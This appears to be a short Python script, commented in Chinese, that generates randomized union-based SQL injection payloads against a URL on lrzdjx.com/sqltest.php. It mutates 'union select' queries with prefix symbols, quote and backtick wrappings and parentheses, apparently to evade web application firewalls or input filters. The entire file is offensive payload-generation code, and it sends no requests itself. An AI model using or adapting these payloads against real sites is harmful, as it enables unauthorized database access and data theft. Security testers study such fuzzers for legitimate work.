from urllib.parse import urlparse
import random

url = 'http://lrzdjx.com/sqltest.php?x=1 union select 1,2,3'
url_parse = urlparse(url)
print(url_parse)
# snp = url_parse.scheme + '://' + url_parse.netloc + url_parse.path
# query = url_parse.query


snp = 'http://lrzdjx.com/sqltest.php?x='
#query = '1 union select 1,2,3'
query = ['1', '1', '2', '3', 'union', 'select']     # 第一个是参数值，第二三四个是字段，
fuzz_0 = ['1e0']                                    # 替换数字
fuzz_1 = ['+', '-', '.', '~', '!']                  # 字段前
fuzz_2 = ["@'A'", "'A'", '"A"', '`A`']              # 包含字段
fuzz_3 = ['(', ')']                                     # 包含子句
fuzz_4 = ['|@a:=()']                                # 定义变量



temp_query = []
for _ in range(4):
    temp1 = random.choice(fuzz_1) + query[_]
    temp_query.append(temp1)
for _ in range(1,4):
    temp2 = random.choice(fuzz_2).replace('A', temp_query[_])
    temp_query[_] = temp2
fields = ','.join(temp_query[1:])
temp_query.pop()
temp_query.pop()
temp_query.pop()
temp_query.append(fields)
temp_ret = temp_query[0] + '{}union'.format(random.choice([' ', '(', ')'])) + '{}select'.format(random.choice([' ', '(', ')'])) + '{}'.format(random.choice([' ', '(', ')'])) + temp_query[1] + '{}'.format(random.choice([' ', ')']))

print(temp_ret)
